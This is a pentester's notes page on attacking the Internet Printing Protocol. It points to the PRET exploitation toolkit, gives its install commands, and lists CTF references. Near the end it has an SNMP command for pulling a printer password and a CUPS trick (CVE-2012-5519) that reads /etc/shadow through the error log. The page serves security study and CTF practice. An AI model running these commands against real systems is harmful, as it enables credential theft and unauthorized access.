# Internet Printing Protocol (IPP)

<div class="row row-cols-lg-2"><div>

The Internet Printing Protocol (IPP) is protocol to manage printers and print jobs, query printer status, and other tasks.

🐊️ **Port**: 631 (TCP)

Refer to the [IPP Guide](https://www.pwg.org/ipp/ippguide.html). Not all printers use the IPP protocol. See also: [Hacking Network Printers](https://www.irongeek.com/i.php?page=security/networkprinterhacking).
</div><div>
</div></div>

<hr class="sep-both">

## IPP vulnerabilities ☠️

[![printerhacking101](../../../cybersecurity/_badges/thm/printerhacking101.svg)](https://tryhackme.com/room/printerhacking101)

<div class="row row-cols-lg-2"><div>

👉 See the [Printer Security Testing Cheat Sheet](http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet).

You can use the [PRET](https://github.com/RUB-NDS/PRET) <small>(4.0k ⭐)</small> toolkit to try to exploit printers using the IPP protocol. You can install it using: 

```shell!
$ git clone https://github.com/RUB-NDS/PRET && cd PRET
$ python2 -m pip install colorama pysnmP
```

Discover printers

```ps
$ python pret.py
```

</div><div>

Once you found a printer, you must find which language the printer understands

* `xxx.lan ps`: Postscript language
* `IP pjl`: Printer Job language
* `/dev/usb/lp0 pcl`: Printer Command Language, Must be directly connected <small>(for instance, by USB)</small>.

```ps
$ python pret.py [options above]
xxx> help
```

➡️ You can check the web interface <small>(IP:631)</small> if any.

➡️ You may use [PRETty](https://github.com/BusesCanFly/PRETty) <small>(0.2k ⭐)</small>, an automation of PRET in python.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

[![antique](../../../cybersecurity/_badges/htb-p/antique.svg)](https://app.hackthebox.com/machines/Antique)

* SNMP could be used to get the printer password (`snmpget -v 1 -c public IP .1.3.6.1.4.1.11.2.3.9.1.1.13.0`) 

```py
bytes_hex = "<returned bytes here>"
bytes_list = bytes_hex.split()
print("".join([chr(int(byte, 16)) for byte in bytes_list]))
```

* CUPS (CVE-2012-5519 == arbitrary read or if there are printers, we can also use [CVE-2015-1158](https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py))

```
$ cupsctl ErrorLog=/etc/shadow
$ curl localhost:631/admin/log/error_log?
```
</div><div>
</div></div>